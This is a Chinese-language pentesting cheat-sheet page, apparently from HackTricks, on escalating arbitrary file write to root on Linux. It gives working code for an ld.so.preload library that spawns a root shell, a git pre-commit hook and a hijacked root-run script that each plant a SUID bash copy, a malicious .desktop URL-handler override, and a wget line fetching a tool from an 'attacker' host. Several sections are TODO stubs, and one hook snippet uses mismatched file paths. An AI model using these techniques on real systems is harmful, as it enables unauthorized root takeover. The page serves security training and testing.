# 任意文件写入到 root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

该文件的行为类似 **`LD_PRELOAD`** 环境变量，但它也在 **SUID 二进制文件** 中生效。\
如果你能创建或修改它，你可以添加一个**每次执行的二进制都会加载的库的路径**。

例如： `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) 是在 git 仓库中各种 **事件**（例如创建 commit、合并等）发生时会被 **运行** 的 **脚本**。所以如果一个经常执行这些操作的 **有特权的脚本或用户** 并且可以 **向 `.git` 文件夹 写入**，这可以用来进行 **privesc**。

例如，可以在 git 仓库的 **`.git/hooks`** 中 **生成一个脚本**，使其在创建新 commit 时始终被执行：
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

位于 `/proc/sys/fs/binfmt_misc` 的文件指示哪个二进制应执行哪种类型的文件。TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

攻击者如果对受害者的配置目录具有写权限，可以轻易替换或创建文件以改变系统行为，从而导致意外的代码执行。通过修改 `$HOME/.config/mimeapps.list` 文件，将 HTTP 和 HTTPS URL 处理程序指向恶意文件（例如设置 `x-scheme-handler/http=evil.desktop`），攻击者可以确保 **点击任何 http 或 https 链接会触发该 `evil.desktop` 文件中指定的代码**。例如，在将以下恶意代码放入 `$HOME/.local/share/applications` 中的 `evil.desktop` 后，任何外部 URL 点击都会运行其中嵌入的命令：
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) where it was used to exploit a real vulnerability.

### Root 执行用户可写的脚本/二进制文件

如果有特权的工作流运行类似 `/bin/sh /home/username/.../script`（或位于非特权用户拥有的目录内的任何二进制文件），你可以劫持它：

- **检测执行：** 使用 [pspy](https://github.com/DominicBreuker/pspy) 监控进程以捕获 root 调用用户可控路径：
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** 确保目标文件及其目录都归你的用户所有并且可写。
- **Hijack the target:** 备份原始 binary/script 并放置 payload，使其创建一个 SUID shell（或任何其他 root 操作），然后恢复权限：
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **触发特权操作** (例如，按下某个会 spawn helper 的 UI 按钮)。当 root 重新执行被劫持的路径时，使用 `./rootshell -p` 获取提权后的 shell。

## 参考

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)

{{#include ../../banners/hacktricks-training.md}}
